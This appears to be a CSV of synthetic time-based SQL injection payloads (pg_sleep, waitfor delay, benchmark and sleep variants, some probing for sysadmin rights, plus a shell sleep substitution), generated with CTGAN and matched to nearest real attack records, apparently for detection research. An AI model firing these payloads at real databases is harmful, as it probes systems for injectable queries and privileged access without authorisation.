+CTGAN_000235,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.7202235286553185
+CTGAN_000236,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.442865925518232
+CTGAN_000237,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,7.342608948553938
+CTGAN_000238,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,7.238005928701359
+CTGAN_000239,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,7.537521510202381
+CTGAN_000240,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.708315899963258
+CTGAN_000241,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,8.169371970609173
+CTGAN_000242,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,8.739783053775428
+CTGAN_000243,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.738244435938139
+CTGAN_000244,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,6.39086887241577
+CTGAN_000245,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,6.121996825337574
+CTGAN_000246,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,8.821518308692355
+CTGAN_000247,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,6.022421900464584
+CTGAN_000248,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,5.241169375830642
+CTGAN_000249,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,6.501847296612381
+CTGAN_000250,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.773034045467744
+CTGAN_000251,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.93618384992027
+CTGAN_000252,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,6.413716711526338
+CTGAN_000253,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.838112348408897
+CTGAN_000254,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.789954444728024
+CTGAN_000255,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,7.048538749911502
+CTGAN_000256,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,6.2910436212650955
+CTGAN_000257,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.4119049830677195
+CTGAN_000258,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,7.56806840000958
+CTGAN_000259,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.492563255924965
+CTGAN_000260,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.958754923207861
+CTGAN_000261,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,7.336307724397393
+CTGAN_000262,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.0052061845661795
+CTGAN_000263,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.089735609522583
+CTGAN_000264,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.6703228277529885
+CTGAN_000265,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,8.840089908586648
+CTGAN_000266,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.190738586119106
+CTGAN_000267,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.33239738855426
+CTGAN_000268,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,9.95477472713774
+CTGAN_000269,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.371664460147506
+CTGAN_000270,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.209898038061524
+CTGAN_000271,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.402672244427628
+CTGAN_000272,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.296422858637001
+CTGAN_000273,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.5960356495354775
+CTGAN_000274,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.787533008444915
+CTGAN_000275,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,8.528550104077198
+CTGAN_000276,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.256226910600426
+CTGAN_000277,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.7493840414617585
+CTGAN_000278,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,8.095204733238813
+CTGAN_000279,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,6.86178635447634
+CTGAN_000280,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.606653099831802
+CTGAN_000281,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,4.026608900170158
+CTGAN_000282,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.891256388339408
+CTGAN_000283,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.378399883909394
+CTGAN_000284,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.889563718722961
+CTGAN_000285,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.274194779148401
+CTGAN_000286,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.7605436104741585
+CTGAN_000287,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,7.200401366524449
+CTGAN_000288,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.181499672155631
+CTGAN_000289,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.569882361314098
+CTGAN_000290,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,9.208381751544822
+CTGAN_000291,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,6.838104935288957
+CTGAN_000292,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,8.679874919325822
+CTGAN_000293,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.290150610960851
+CTGAN_000294,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.421226740251376
+CTGAN_000295,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.584514430189951
+CTGAN_000296,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,4.961547466573744
+CTGAN_000297,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,8.692887160122368
+CTGAN_000298,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,8.452731908996036
+CTGAN_000299,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,9.234492499802384
+CTGAN_000300,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.580573646187367
+CTGAN_000301,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,9.312247930652946
+CTGAN_000302,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,6.475914157084563
+CTGAN_000303,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,4.9119157701712854
+CTGAN_000304,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.761258185843885
+CTGAN_000305,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,6.83558531671267
+CTGAN_000306,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.603887046239395
+CTGAN_000307,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,6.733618072330612
+CTGAN_000308,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,7.906636794030074
+CTGAN_000309,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.767059850206992
+CTGAN_000310,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.568554653944844
+CTGAN_000311,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,6.308021383036798
+CTGAN_000312,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.8567246380096085
+CTGAN_000313,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.871384298933588
+CTGAN_000314,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.630381152786658
+CTGAN_000315,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,8.20376820355746
+CTGAN_000316,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.697187333288324
+CTGAN_000317,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,7.882859404518936
+CTGAN_000318,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,7.251183630736869
+CTGAN_000319,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,6.289527889433858
+CTGAN_000320,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.462006929541692
+CTGAN_000321,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.135723063371062
+CTGAN_000322,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.353378862144762
+CTGAN_000323,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.95396766502563
+CTGAN_000324,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,8.364885685814905
+CTGAN_000325,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,8.051738209829717
+CTGAN_000326,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,8.574276915336434
+CTGAN_000327,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.520632450480671
+CTGAN_000328,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,7.22343659154257
+CTGAN_000329,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.4521265454498655
+CTGAN_000330,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.738523246218099
+CTGAN_000331,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.794620904627196
+CTGAN_000332,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,6.742134343700704
+CTGAN_000333,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,5.0847843574112
+CTGAN_000334,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.687005373527147
+CTGAN_000335,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.219638356075965
+CTGAN_000336,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,6.545522778505602
+CTGAN_000337,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.9671666033823785
+CTGAN_000338,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,4.91409519591659
+CTGAN_000339,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,6.075635560811312
+CTGAN_000340,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,6.488553117975313
+CTGAN_000341,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,5.2754209881919465
+CTGAN_000342,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.65715114619641
+CTGAN_000343,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,4.998317034734199
+CTGAN_000344,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.238604117731329
+CTGAN_000345,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,6.948430357392256
+CTGAN_000346,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.058182083446779
+CTGAN_000347,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,4.746296779184389
+CTGAN_000348,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,8.886143680623622
+CTGAN_000349,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.973854519337492
+CTGAN_000350,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,7.806907150880829
+CTGAN_000351,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,9.238606285627924
+CTGAN_000352,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.635300581575998
+CTGAN_000353,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.625156496029568
+CTGAN_000354,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,8.555139178165694
+CTGAN_000355,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,6.77216969660699
+CTGAN_000356,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.352629195050051
+CTGAN_000357,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,4.553447882752751
+CTGAN_000358,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.478824652882273
+CTGAN_000359,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,8.49646092961835
+CTGAN_000360,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,8.573493797471993
+CTGAN_000361,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.2918933742506065
+CTGAN_000362,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.410962528892474
+CTGAN_000363,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.610939740576405
+CTGAN_000364,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.85217135000413
+CTGAN_000365,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.55915994368627
+CTGAN_000366,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.584906592328742
+CTGAN_000367,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,6.747575973705726
+CTGAN_000368,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.704822553014888
+CTGAN_000369,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.765159040373186
+CTGAN_000370,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.590241181428116
+CTGAN_000371,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,7.991668881802572
+CTGAN_000372,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.822215705632814
+CTGAN_000373,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,8.239292014415796
+CTGAN_000374,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.087663431443445
+CTGAN_000375,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,7.373372575325818
+CTGAN_000376,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,7.0068690695146545
+CTGAN_000377,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,8.15215838428683
+CTGAN_000378,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,5.257421243041498
+CTGAN_000379,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.248309722806476
+CTGAN_000380,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,6.252366374569946
+CTGAN_000381,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,8.132662849166563
+CTGAN_000382,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.968238374657509
+CTGAN_000383,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.918747829852116
+CTGAN_000384,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,6.8200953426939055
+CTGAN_000385,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,8.269559333659362
+CTGAN_000386,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.930050542055935
+CTGAN_000387,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,7.581511818244076
+CTGAN_000388,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,5.628940037121486
+CTGAN_000389,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,8.454952316604833
+CTGAN_000390,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,8.716550724844234
+CTGAN_000391,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,7.786865218622202
+CTGAN_000392,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.19305470385538
+CTGAN_000393,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.902770942828897
+CTGAN_000394,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,5.889718934152584
+CTGAN_000395,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,5.844613135340186
+CTGAN_000396,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,6.55766410914362
+CTGAN_000397,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.714730678999261
+CTGAN_000398,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,9.1180392311079
+CTGAN_000399,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.590646938730244
+CTGAN_000400,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,4.992692210313517
+CTGAN_000401,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,5.648059359067984
+CTGAN_000402,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,8.15670844355414
+CTGAN_000403,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.956709917931793
+CTGAN_000404,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,7.121661195770312
+CTGAN_000405,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,5.984594447256099
+CTGAN_000406,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.92226179607317
+CTGAN_000407,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,7.689873739273928
+CTGAN_000408,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.977547090479418
+CTGAN_000409,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,8.889607050116755
+CTGAN_000410,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,7.367896852938115
+CTGAN_000411,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,5.9633547014668205
+CTGAN_000412,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.396858931587548
+CTGAN_000413,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.164140207281044
+CTGAN_000414,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.952944621839011
+CTGAN_000415,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,5.82969237238483
+CTGAN_000416,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,8.832466738975999
+CTGAN_000417,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,5.432603478927894
+CTGAN_000418,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.676148504464957
+CTGAN_000419,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,7.4773224367602875
+CTGAN_000420,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.11031490355308
+CTGAN_000421,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,6.7183935351293504
+CTGAN_000422,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.793115336051759
+CTGAN_000423,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,5.08527636553652
+CTGAN_000424,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,8.206380435280051
+CTGAN_000425,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,4.706058641361892
+CTGAN_000426,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.798726000413784
+CTGAN_000427,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,8.23116739529122
+CTGAN_000428,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,8.465942170871054
+CTGAN_000429,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,6.4082456858429895
+CTGAN_000430,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.033410611437045
+CTGAN_000431,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.368442826635638
+CTGAN_000432,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,6.475891830607957
+CTGAN_000433,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.121006244283668
+CTGAN_000434,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,6.7686897918904805
+CTGAN_000435,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,7.259054300132812
+CTGAN_000436,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.679599707682332
+CTGAN_000437,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.3888506181692035
+CTGAN_000438,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,7.9610251781521555
+CTGAN_000439,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,6.215217768210949
+CTGAN_000440,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,4.7199749435331295
+CTGAN_000441,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,8.697368517799534
+CTGAN_000442,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,8.7304403452148
+CTGAN_000443,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.910924055884854
+CTGAN_000444,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.129914755819909
+CTGAN_000445,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,8.501563553172597
+CTGAN_000446,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.061159485811785
+CTGAN_000447,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.861011441294968
+CTGAN_000448,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.923815212313703
+CTGAN_000449,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,7.608485474005941
+CTGAN_000450,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,7.604735019193121
+CTGAN_000451,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,7.300740880432778
+CTGAN_000452,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.319515415877331
+CTGAN_000453,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,5.753832220802146
+CTGAN_000454,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.813654047157673
+CTGAN_000455,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,4.134330386068755
+CTGAN_000456,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.141885689120469
+CTGAN_000457,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,6.986823157223807
+CTGAN_000458,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.298563646891818
+CTGAN_000459,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.389552962071945
+CTGAN_000460,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,5.944798794006883
+CTGAN_000461,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,6.570545038232887
+CTGAN_000462,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,6.5257343737042275
+CTGAN_000463,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.19568401121514
+CTGAN_000464,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,8.647078340404386
+CTGAN_000465,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,7.092077047764291
+CTGAN_000466,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.560713361507381
+CTGAN_000467,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,6.502291718308797
+CTGAN_000468,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.399621082392746
+CTGAN_000469,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,5.521290372901945
